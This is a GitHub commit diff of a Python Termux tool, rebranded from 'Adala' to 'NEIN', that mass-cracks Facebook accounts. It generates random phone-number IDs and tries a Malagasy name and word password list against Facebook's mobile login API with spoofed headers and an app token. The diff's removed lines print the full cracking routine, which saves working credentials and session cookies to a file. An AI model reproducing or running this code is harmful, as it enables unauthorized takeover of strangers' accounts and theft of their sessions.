@@ -1,5 +1,6 @@
 # Définir le numéro de version
-version_actuelle = "2.0"
+version_actuelle = "1.5"
+
 import os
 import random
 import string 
@@ -11,13 +12,10 @@ import requests
 import sys
 import secrets
 import getpass
-
 # Mot de passe pour déverrouiller le script
 mot_de_passe = "ITACHI2024"
-
 # Demander à l'utilisateur de saisir le mot de passe
 saisie_mot_de_passe = getpass.getpass("Veuillez entrer le mot de passe : ")
-
 # Vérifier si le mot de passe saisi est correct
 if saisie_mot_de_passe == mot_de_passe:
     print("Mot de passe correct. Exécution de git pull...")
@@ -28,7 +26,6 @@ if saisie_mot_de_passe == mot_de_passe:
         print(f"Erreur lors de l'exécution de git pull : {e}")
         exit(1)
     print("Git pull terminé avec succès !")
-
 #-------------color----------------#
 bblack="\033[1;30m"         # Black
 M="\033[1;31m"            # Red
@@ -50,8 +47,6 @@ line_colors = [bblack, M, H, byellow, bblue, P, C, B]
 word_colors = [B, C, P, H, M, byellow, bblue, P, C, B]
 #-------------logo-----------------#
 logo=(f'''{B}
-
-
                                  
 ,--.  ,--.,------.,--.,--.  ,--. 
 |  ,'.|  ||  .---'|  ||  ,'.|  | 
@@ -59,15 +54,14 @@ logo=(f'''{B}
 |  | `   ||  `---.|  ||  | `   | 
 `--'  `--'`------'`--'`--'  `--' 
                                  
-
                                             
-
 {warna}--------------------------------------------{B}
- Owner    : {M}Safidy{M}
- TOOL NAME : {warna}{P}Adala{P}{warna}
- STATUE : {H}Paid{H}
- Facebook : {bblue}SM{bblue}
- Tools    : {warna}[{M}VERSION 2.0{warna}]{warna}
+ Owner    : {M}CHRICE999{M}
+ TOOL NAME : {warna}{P}NEIN{P}{warna}
+ GROUPE-FB   : [TERMUX-COMAND]
+ STATUE : {H}FREE{H}
+ Facebook : {bblue}ITACHI SQ{bblue}
+ Tools    : {warna}[{M}VERSION 1.5{warna}]{warna}
 --------------------------------------------{B}''')
 #-------------linex def -------------#
 def linex():
@@ -105,7 +99,7 @@ def BD_CLONING():
     for nmbr in range(limit):
         nmp=''.join(map(str, generate_random_sequence(7)))
         user.append(nmp)
-    with tred(max_workers=50) as Dipto:
+    with tred(max_workers=30) as Dipto:
         tl=str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
@@ -113,7 +107,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'nantenaina','Nantenaina','Andoniaina','Rakoto','rakoto','andoniaina','Lalaina','lalaina','diamondra','Diamondra','mamisoa','Mamisoa', 'nomena','Nomena','vololona','Vololona','ferdinand','Ferdinand','joselain','Joselain','jehovah','Jehovah','richard','Richard','vanessa','Vanessa','Rakotonirina','michel','Michel','fanantenana','Fanantenana','rakotonirina','rakotomalala','Rakotomalala','rakotoarimanana','Rakotoarimanana','ragasy','Ragasy','solofo','Solofo','123456','michael','andriamihaja','Andriamihaja','anjarasoa','domoina','12345','Domoina','Anjarasoa','finaritra','Finaritra',','sarobidy','Sarobidy','bekoto','Bekoto','dahalo','Dahalo','valisoa','Valisoa','narindra','Narindra','daniela','Daniela','chérie','Chérie','faniriana','Faniriana','madagasikara','Madagasikara','lalatiana','Lalatiana','sarah''Fanomezantsoa','fanomezantsoa','Frédérick','frédérick','volatiana','Volatiana','fandresena','Fandresena','faniry','Faniry','fehizoro','Fehizoro','mivady','Mivady','fanomezana','Fanomezana','martine','Martine','nirina','Nirina','radonirina','dokotera','Dokotera','Aina','aina','rasoa','Rasoa','Tiavina','tiavina','zazakely','Zazakely','sarindra','Sarindra','nandrianina','Nandrianina','Lanto','mahefa','Mahefa','miora','Miora','maraina','Maraina','hariva','Hariva','safidiniaina','Safidiniaina','anthonio','Anthonio','Anjara','anjara','andry rajoelina','Andry rajoelina','siteny','Siteny','Mahery','mahery','kimaso','kaylelena','sodoma','Sodoma','mahamasina','Mahamasina','tahinaa','Tahiana','analakely','Analakely','ambanidia','Ambanidia','gendarme','Gendarme','polisy','Polisy','william','William','niaina','Niaina','marion','Marion','fenohasina','Fenohasina','lahatra','Lahatra','rakotoson','Rakotoson','maholy','Maholy','mamitiana','Mamitiana','mbolatiana','Mbolatiana','nambinina','Nambinina','rindra','Rindra','sahaza','Sahaza','saholy','Saholy','sahondra','Sahondra','santatra','Santatra','tsiresy','Tsiresy','tsiferana','Tsiferana','fenosoa','Fenosoa']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Malala','fitiavana','mamako', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika', 'mendrikarivo', 'mendrikarivo', 'antananarivo', 'antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy']
             Dipto.submit(method_crack,ids,passlist)
     linex()
     print(' LE CLONING EST FINI ')
@@ -122,57 +116,21 @@ def BD_CLONING():
     input(' PRESS ENTER TO BACK  : ')
     MR_ITACHI()
 #------------ method crack def ---------#
-def method_crack(ids, passlist):
-    global oks
-    global cps
-    global loop
-    try:
-        for pas in passlist:
-            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
-            sys.stdout.flush()
-            adid=str(uuid.uuid4())
-            device_id=str(uuid.uuid4())
-            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
-            header={'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
-            url='https://api.facebook.com/method/auth.login'
-            reqx=requests.post(url,data=datax,headers=header).json()
-            if 'session_key' in reqx:
-                try:
-                    uid=reqx['uid']
-                except:
-                    uid=ids
-                if str(uid) in oks:
-                    break
-                else:
-                    print('\r\r \033[1;32m[Safidy-OK] '+str(uid)+' | '+pas+'\033[1;37m')
-                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
-                    print('\033[1;32m [COOKIES] '+coki)
-                    # Vérifier si le dossier Safidy-IDS existe et le créer si nécessaire
-                    if not os.path.exists("/sdcard/Safidy-IDS"):
-                        os.makedirs("/sdcard/Safidy-IDS")
-                    # Enregistrer dans le fichier Safidy-OK.txt
-                    with open(os.path.join("/sdcard/Safidy-IDS", "Safidy-OK.txt"), 'a') as f:
-                        f.write(str(uid)+'|'+pas+'|'+coki+'\n')
-                    oks.append(str(uid))
-                    break
-            elif 'www.facebook.com' in reqx['error_msg']:
-                print('\r\r \033[1;30m[Safidy-CP] '+ids+' | '+pas+'\033[1;37m')
-                # Enregistrer dans le fichier Safidy-CP.txt
-                with open(os.path.join("/sdcard/Safidy-IDS", "Safidy-CP.txt"), 'a') as f:
-                    f.write(ids+'|'+pas+'\n')
-                cps.append(ids)
-                break
-            else:
-                continue
-        loop+=1
-    except:
-        pass
-#-------------end----------------#
-
-# Générateur de séquence aléatoire
-def generate_random_sequence(length):
-    sequence = [random.choice(string.digits) for _ in range(length)]
-    return sequence
-
-# Appel à la fonction MR_ITACHI pour démarrer le programme
-MR_ITACHI()
+0 comments on commit e73db16
+Comment
+ 
+Leave a comment
+ 
+ You’re not receiving notifications from this thread.
+Footer
+© 2024 GitHub, Inc.
+Footer navigation
+Terms
+Privacy
+Security
+Status
+Docs
+Contact
+Manage cookies
+Do not share my personal information
+Add files via upload · chrice999/chrice999@e73db16
